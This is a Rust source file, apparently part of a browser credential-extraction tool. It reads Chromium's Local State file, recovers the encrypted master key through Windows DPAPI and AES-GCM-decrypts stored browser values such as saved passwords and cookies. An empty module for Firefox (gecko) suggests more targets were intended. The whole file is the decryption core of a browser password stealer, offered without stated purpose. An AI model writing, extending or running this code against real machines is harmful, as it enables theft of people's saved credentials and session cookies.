pub mod chromium {
    use aes_gcm::aead::generic_array::GenericArray;
    use aes_gcm::aead::Aead;
    use aes_gcm::{Aes256Gcm, KeyInit};
    use serde_json::Value;
    use std::fs;
    use std::path::PathBuf;
    use winapi::um::dpapi::CryptUnprotectData;
    use winapi::um::wincrypt::CRYPTOAPI_BLOB; // Or `Aes128Gcm`

    pub fn dpapi_decrypt(mut ciphertext: Vec<u8>) -> Vec<u8> {
        let mut in_data = CRYPTOAPI_BLOB {
            cbData: ciphertext.len() as u32,
            pbData: ciphertext.as_mut_ptr(),
        };

        let mut out_data = CRYPTOAPI_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };

        unsafe {
            CryptUnprotectData(
                &mut in_data,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                0,
                &mut out_data,
            );

            let plaintext = Vec::from_raw_parts(
                out_data.pbData,
                out_data.cbData as usize,
                out_data.cbData as usize,
            );

            return plaintext;
        };
    }

    pub fn aes_decrypt(ciphertext: Vec<u8>, master_key: &Vec<u8>) -> Vec<u8> {
        let key = GenericArray::from_slice(&master_key);
        let cipher = Aes256Gcm::new(key);

        let nonce = GenericArray::from_slice(&ciphertext[3..15]);

        let plaintext = match cipher.decrypt(nonce, &ciphertext[15..]) {
            Ok(plaintext) => plaintext,
            Err(_) => dpapi_decrypt(ciphertext),
        };

        return plaintext;
    }

    pub fn get_master_key(master_key_path: &PathBuf) -> Option<Vec<u8>> {
        let contents = fs::read_to_string(master_key_path).ok()?;

        let json: Value = serde_json::from_str(contents.as_str()).ok()?;

        if let Some(encrypted_key) = json["os_crypt"]["encrypted_key"].as_str() {
            let plaintext = base64::decode(encrypted_key).ok()?[5..].to_vec();
            let master_key = dpapi_decrypt(plaintext);
            return Some(master_key);
        }
        return None;
    }
}


pub mod gecko {
    
}